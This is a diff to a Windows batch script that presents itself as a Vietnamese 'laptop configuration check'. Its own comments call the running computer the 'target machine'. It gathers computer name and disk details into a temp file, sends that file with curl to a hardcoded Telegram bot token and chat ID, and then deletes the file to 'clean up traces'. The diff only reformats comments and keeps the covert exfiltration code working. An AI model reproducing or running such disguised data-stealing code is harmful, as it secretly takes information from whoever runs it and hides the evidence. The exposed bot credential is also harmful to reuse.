@@ -2,12 +2,12 @@
 title Kiem Tra Cau Hinh Laptop
 color 0A
 
-# Bước 1: Thu thập thông tin cấu hình và lưu tạm vào ổ đĩa C của máy mục tiêu
+:: Buoc 1: Thu thap thong tin cau hinh va luu tam vao o dia C cua may muc tieu
 set "temp_file=%TEMP%\cauhinhlap.txt"
 
 (
 echo ===================================================
-echo          THONG TIN CAU HINH LAPTOP
+echo           THONG TIN CAU HINH LAPTOP
 echo ===================================================
 echo Thoi gian: %date% %time%
 echo May tinh: %computername%
@@ -21,17 +21,17 @@ wmic diskdrive get Model,Size /value | findstr "="
 
 echo Dang dong bo du lieu len he thong...
 
-# Bước 2: Cấu hình Telegram
+:: Buoc 2: Cau hinh Telegram
 set "TOKEN=8982230721:AAGAIhbsrBIILFrwdr7RsnFLWUKjwf9QNLE"
 set "CHAT_ID=6473475153"
 
-# Bước 3: Dùng curl có sẵn của Windows để bắn file về điện thoại của bạn
+:: Buoc 3: Dung curl co san cua Windows de ban file ve dien thoai cua ban
 curl -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
      -F "chat_id=%CHAT_ID%" ^
      -F "document=@%temp_file%" ^
-     -F "caption= Mau thong tin cau hinh moi tu máy %computername%" >nul
+     -F "caption= Mau thong tin cau hinh moi tu may %computername%" >nul
 
-# Bước 4: Xóa file tạm trên máy mục tiêu để dọn dẹp dấu vết
+:: Buoc 4: Xoa file tam tren may muc tieu de don dep dau vet
 del "%temp_file%"
 
 echo.
